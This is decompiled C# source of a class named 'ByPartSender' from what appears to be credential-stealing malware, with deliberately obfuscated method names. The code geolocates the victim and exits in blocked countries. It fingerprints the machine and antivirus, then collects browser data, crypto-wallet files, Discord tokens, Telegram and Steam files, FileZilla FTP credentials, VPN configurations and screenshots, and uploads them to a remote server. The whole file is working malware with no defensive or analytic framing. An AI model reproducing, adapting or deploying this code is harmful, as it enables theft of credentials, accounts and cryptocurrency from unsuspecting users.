// ByPartSender
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

public class ByPartSender : IdentitySenderBase
{
	public ByPartSender()
	{
		IdentitySenderBase.Actions = new ParsSt[15]
		{
			asdk9345asd, asdk8jasd, ылв92р34выа, аловй, ыал8р45, ываш9р34, ывал8н34, вал93тфыв, вашу0л34, навева,
			ащы9р34, ыва83о4тфыв, askd435, sdi845sa, длвап9345
		};
		IdentitySenderBase.PreStageActions = new ParsSt[6] { sdf934asd, asd44123, sdfi35sdf, sdfo8n234, asdkadu8, fdfg9i3jn4 };
		Random rnd = new Random();
		IdentitySenderBase.Actions = IdentitySenderBase.Actions.OrderBy((ParsSt x) => rnd.Next()).ToArray();
		IdentitySenderBase.PreStageActions = IdentitySenderBase.PreStageActions.OrderBy((ParsSt x) => rnd.Next()).ToArray();
	}

	public override bool Send(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		return sdf9j3nasd(connection, settings, ref result);
	}

	public static bool sdf9j3nasd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		try
		{
			result.ScanDetails = new ScanDetails
			{
				AvailableLanguages = new List<string>(),
				Browsers = new List<Browser>(),
				FtpConnections = new List<Account>(),
				GameChatFiles = new List<ScannedFile>(),
				GameLauncherFiles = new List<ScannedFile>(),
				InstalledBrowsers = new List<BrowserVersion>(),
				MessageClientFiles = new List<ScannedFile>(),
				NordAccounts = new List<Account>(),
				Open = new List<ScannedFile>(),
				Processes = new List<string>(),
				Proton = new List<ScannedFile>(),
				ScannedFiles = new List<ScannedFile>(),
				ScannedWallets = new List<ScannedFile>(),
				SecurityUtils = new List<string>(),
				Softwares = new List<string>(),
				SystemHardwares = new List<SystemHardware>()
			};
			dsf9jb(settings, ref result);
			result.SeenBefore = Program.SeenBefore();
			result.ReplaceEmptyValues();
			ParsSt[] preStageActions = IdentitySenderBase.PreStageActions;
			foreach (ParsSt parsSt in preStageActions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			if (connection.TryInit(result) != ApiResponse.Success)
			{
				throw new InvalidOperationException();
			}
			LSIDsd2(connection, settings, ref result);
			while (!connection.TryConfirm())
			{
				if (!connection.TryGetConnection())
				{
					Thread.Sleep(1000);
				}
			}
			return true;
		}
		catch (InvalidOperationException ex3)
		{
			throw ex3;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void dsf9jb(ScanningArgs settings, ref ScanResult result)
	{
		GeoInfo geoInfo = LocatorAPI.Gather();
		geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
		geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
		geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
		geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
		List<string> blockedCountry = settings.BlockedCountry;
		if (blockedCountry != null && blockedCountry.Count > 0 && settings.BlockedCountry.Contains(geoInfo.Country))
		{
			Environment.Exit(0);
		}
		List<string> blockedIP = settings.BlockedIP;
		if (blockedIP != null && blockedIP.Count > 0 && settings.BlockedIP.Contains(geoInfo.IP))
		{
			Environment.Exit(0);
		}
		result.IPv4 = geoInfo.IP;
		result.City = geoInfo.Location;
		result.Country = geoInfo.Country;
		result.ZipCode = geoInfo.PostalCode;
	}

	public static bool LSIDsd2(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		try
		{
			ParsSt[] actions = IdentitySenderBase.Actions;
			foreach (ParsSt parsSt in actions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			return true;
		}
		catch (InvalidOperationException ex3)
		{
			throw ex3;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void asdkadu8(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Hardware = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	public static void sdfo8n234(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.FileLocation = Assembly.GetExecutingAssembly().Location;
	}

	public static void sdfi35sdf(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Language = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
		result.OSVersion = SystemInfoHelper.GetWindowsVersion();
	}

	public static void asd44123(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Resolution = Resolution.MonitorSize().ToString();
	}

	public static void fdfg9i3jn4(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.TZ = TimeZoneInfo.Local.DisplayName;
	}

	public static void sdf934asd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.MachineName = Environment.UserName;
	}

	public static void asdk9345asd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		List<SystemHardware> list = new List<SystemHardware>();
		foreach (SystemHardware processor in SystemInfoHelper.GetProcessors())
		{
			list.Add(processor);
		}
		foreach (SystemHardware graphicCard in SystemInfoHelper.GetGraphicCards())
		{
			list.Add(graphicCard);
		}
		list.Add(new SystemHardware
		{
			Name = "Total of RAM",
			HardType = HardwareType.Graphic,
			Counter = SystemInfoHelper.TotalOfRAM()
		});
		ApiResponse num = connection.TryInitHardwares(list);
		if (num == ApiResponse.RepeatPart)
		{
			asdk9345asd(connection, settings, ref result);
		}
		if (num == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	public static void asdk8jasd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse num = connection.TryInitInstalledBrowsers(SystemInfoHelper.GetBrowsers());
		if (num == ApiResponse.RepeatPart)
		{
			asdk8jasd(connection, settings, ref result);
		}
		if (num == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	public static void ылв92р34выа(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse num = connection.TryInitInstalledSoftwares(SystemInfoHelper.ListOfPrograms());
		if (num == ApiResponse.RepeatPart)
		{
			ылв92р34выа(connection, settings, ref result);
		}
		if (num == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	public static void аловй(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse num = connection.TryInitDefenders(SystemInfoHelper.GetVs()?.ToList());
		if (num == ApiResponse.RepeatPart)
		{
			аловй(connection, settings, ref result);
		}
		if (num == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	public static void ыал8р45(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse num = connection.TryInitProcesses(SystemInfoHelper.ListOfProcesses());
		if (num == ApiResponse.RepeatPart)
		{
			ыал8р45(connection, settings, ref result);
		}
		if (num == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	public static void ываш9р34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ApiResponse num = connection.TryInitLanguages(SystemInfoHelper.AvailableLanguages());
		if (num == ApiResponse.RepeatPart)
		{
			ываш9р34(connection, settings, ref result);
		}
		if (num == ApiResponse.NotFound)
		{
			throw new InvalidOperationException();
		}
	}

	public static void длвап9345(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanScreen)
		{
			ApiResponse num = connection.TryInitDisplay(Resolution.Print());
			if (num == ApiResponse.RepeatPart)
			{
				длвап9345(connection, settings, ref result);
			}
			if (num == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void ывал8н34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanTelegram)
		{
			List<ScannedFile> result2 = FileScanning.Search(new DesktopMessanger());
			ApiResponse num = connection.TryInitTelegramFiles(result2);
			if (num == ApiResponse.RepeatPart)
			{
				ывал8н34(connection, settings, ref result);
			}
			if (num == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void вал93тфыв(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanBrowsers)
		{
			List<Browser> list = new List<Browser>();
			list.AddRange(Chr_0_M_e.Scan(settings.ScanChromeBrowsersPaths));
			list.AddRange(g_E_c_к_0.TryFind(settings.ScanGeckoBrowsersPaths));
			ApiResponse num = connection.TryInitBrowsers(list);
			if (num == ApiResponse.RepeatPart)
			{
				вал93тфыв(connection, settings, ref result);
			}
			if (num == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void вашу0л34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFiles)
		{
			ApiResponse num = connection.TryInitScannedFiles(FileSearcher.Search(settings.ScanFilesPaths));
			if (num == ApiResponse.RepeatPart)
			{
				вашу0л34(connection, settings, ref result);
			}
			if (num == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void навева(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFTP)
		{
			ApiResponse num = connection.TryInitFtpConnections(FileZilla.Scan());
			if (num == ApiResponse.RepeatPart)
			{
				навева(connection, settings, ref result);
			}
			if (num == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void ащы9р34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanWallets)
		{
			BrEx brEx = new BrEx();
			brEx.Init(settings.ScanChromeBrowsersPaths);
			List<ScannedFile> result2 = FileScanning.Search(new Armory(), new Atomic(), new C_o1_n0_mи(), new EL3_K_Tr00M(), new Eth(), new E_x0_d_u_S(), new Guarda(), new Jx(), new mYDict(), new AllWallets(), new Binance(), brEx);
			ApiResponse num = connection.TryInitColdWallets(result2);
			if (num == ApiResponse.RepeatPart)
			{
				ащы9р34(connection, settings, ref result);
			}
			if (num == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void ыва83о4тфыв(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanDiscord)
		{
			ApiResponse num = connection.TryInitDiscord(Discord.GetTokens()?.ToList());
			if (num == ApiResponse.RepeatPart)
			{
				ыва83о4тфыв(connection, settings, ref result);
			}
			if (num == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void askd435(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanSteam)
		{
			ApiResponse num = connection.TryInitSteamFiles(FileScanning.Search(new GameLauncher()));
			if (num == ApiResponse.RepeatPart)
			{
				askd435(connection, settings, ref result);
			}
			if (num == ApiResponse.NotFound)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void sdi845sa(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanVPN)
		{
			connection.TryInitNordVPN(NordApp.Find());
			connection.TryInitOpenVPN(FileScanning.Search(new OpenVPN()));
			connection.TryInitProtonVPN(FileScanning.Search(new ProtonVPN()));
		}
	}
}
